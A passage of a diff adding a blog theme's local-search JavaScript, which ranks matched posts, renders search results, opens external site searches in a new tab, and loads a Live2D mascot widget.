+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
